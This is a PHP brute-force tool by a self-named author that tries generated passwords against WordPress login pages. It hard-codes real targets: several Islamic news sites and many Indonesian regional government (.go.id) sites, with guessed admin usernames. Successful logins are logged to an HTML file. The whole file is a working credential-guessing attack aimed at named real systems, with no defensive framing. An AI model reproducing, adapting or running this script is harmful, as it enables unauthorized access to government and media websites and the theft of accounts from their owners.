<?php

echo "--  .______   .______       __    __  .___________. _______     _______   ______   .______        ______  _______
--  |   _  \  |   _  \     |  |  |  | |           ||   ____|   |   ____| /  __  \  |   _  \      /      ||   ____|
--  |  |_)  | |  |_)  |    |  |  |  | `---|  |----`|  |__      |  |__   |  |  |  | |  |_)  |    |  ,----'|  |__
--  |   _  <  |      /     |  |  |  |     |  |     |   __|     |   __|  |  |  |  | |      /     |  |     |   __|
--  |  |_)  | |  |\  \----.|  `--'  |     |  |     |  |____    |  |     |  `--'  | |  |\  \----.|  `----.|  |____
--  |______/  | _| `._____| \______/      |__|     |_______|   |__|      \______/  | _| `._____| \______||_______|

						 ____       	 __  __       _        _              ___      _
						| __ ) _   _	|  \/  |_   _| |_ __ _| |__  _______ / _ \  __| | ___
						|  _ \| | | |	| |\/| | | | | __/ _` | '_ \|_  / __| | | |/ _` |/ _ \
						| |_) | |_| |	| |  | | |_| | || (_| | | | |/ / (__| |_| | (_| |  __/
						|____/ \__, |	|_|  |_|\__,_|\__\__,_|_| |_/___\___|\___/ \__,_|\___|
						       |___/
											\033[31m Visit : http://mutahzc0de.com\033[0m


";
/**
	 * Bruteforce tools.
	 *
	 * @author mutahzc0de aka Muhammad Taufiq Hidayat
	 * @package	Bruteforce Tools By Mutahzc0de
	 * @copyright	Copyright (c) 2013 - 2016.
	 * @license	http://opensource.org/licenses/MIT	MIT License
	 * @since	Version 1.0.0
	 * @see http://mutahzc0de.com/bruteforce-tools.html
	 * @link  http://mutahzc0de.com
	 * https://www.facebook.com/MutahzCode01
	 * https://www.linkedin.com/in/muhammadtaufiqhidayat
*/
include_once 'Mutahz/wordlistgenerator.class.php';



// TARGET
// $params['username'] dan $params['password']  *ini sesuai dengan parameter yang di terima oleh target

$params['username'][] 	= "salafynews10";
$url[]					= "http://salafynews.com/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://inilah-salafi-takfiri.com/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://liputanislam.com/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://www.media-islam.or.id/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://www.abatasya.net/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://www.gensyiah.com/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://syiahindonesia.net/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://www.nahimunkar.net/wp-login.php";






// <!-- KOTA -->

$params['username'][] 	= "admin";
$url[]					= "http://pidiekab.go.id/wp-login.php";

$params['username'][] 	= "dgea";
$url[]					= "http://niaskab.go.id/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://www.tobasamosirkab.go.id/wp-login.php";

$params['username'][] 	= "dishub";
$url[]					= "http://madina.go.id/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://humbanghasundutankab.go.id/";

$params['username'][] 	= "admin";
$url[]					= "http://payakumbuhkota.go.id/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://pariamankota.go.id/wp-login.php";

$params['username'][] 	= "pakrektor";
$url[]					= "http://siakkab.go.id/wp-login.php";

$params['username'][] 	= "admin"; //belum tauk
$url[]					= "http://www.kotaprabumulih.go.id/wp-login.php";

$params['username'][] 	= "terjunbebas";
$url[]					= "http://bengkuluprov.go.id/wp-login.php";

$params['username'][] 	= "masadmin";
$url[]					= "http://www.rejanglebongkab.go.id/";

$params['username'][] 	= "themaster";
$url[]					= "http://www.mesujikab.go.id/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://pangkalpinangkota.go.id/wp-login.php";

$params['username'][] 	= "admin";
$url[]					= "http://www.cirebonkota.go.id/wp-login.php";

$params['username'][] 	= "dhoni";
$url[]					= "http://www.karanganyarkab.go.id/wp-login.php";

$params['username'][] 	= "kpde";
$url[]					= "http://klatenkab.go.id/wp-login.php";

$params['username'][] 	= "humasjember";
$url[]					= "http://jemberkab.go.id/wp-login.php";

$params['username'][] 	= "andi";
$url[]					= "http://bondowosokab.go.id/wp-login.php";


$jumlahtarget= count($params['username']);

$start  = 8; //di mulai dari berapa karakter
$end 	= 20; //sampai berapa karakter
$no = 1;
for ($i=$start;$i<=$end;$i++)
{
	$ws = new WordlistGenerator($i,'abcdefghijklmopqrstuvwxyz1234567890`~,.<>/?;:"[]{}\|!@#$%^&*()_+=-"ABCDEFGHIJKLMOPQRSTUVWXYZ'); //kira-kira ada karakter apa ajah

	while($ws->isNext()) {

		 // echo $ws->getWord()."</br>"; //dapatkan kata


		$paramsx['pwd'] = $ws->getWord();

		for ($i=0; $i <$jumlahtarget ; $i++) {
			$paramsx['log']=$params['username'][$i];
			//TEST echo var_dump($paramsx);
			//TEST echo "target -> url  :".$url[$i] ."<b>username</b>".$paramsx['log'] ."<b>passsword</b>".$paramsx['password'] ."<hr/>";

			$x  =  $ws->target($url[$i],$paramsx);
echo "USERNAME : ".$paramsx['log']." | PASSWORD : ".$ws->getWord()." ||>";
			 if ($x==NULL) {
			 	 $txt = '
						<tr>
						    <th class="tg-yw4l">'.$url[$i].'</th>
						    <th class="tg-yw4l">'.$paramsx['log'].'</th>
						    <th class="tg-yw4l">'.$paramsx['pwd'].'</th>
						  </tr>
						 ';
					$resultFile = file_put_contents('result.html', $txt.PHP_EOL , FILE_APPEND);
			   //echo "berhasil | URLNYA , :".$url[$i]." username : ".$paramsx['log']."passwordnya :". $ws->getWord()."</br><hr/>";
			 }else{
			 	echo "FAILED : ".$url[$i]."
_____________________________________________________________________________________________________________________
			 	";
			 }
		}




		$ws->nextWord();
	}
	unset($ws);
}
?>
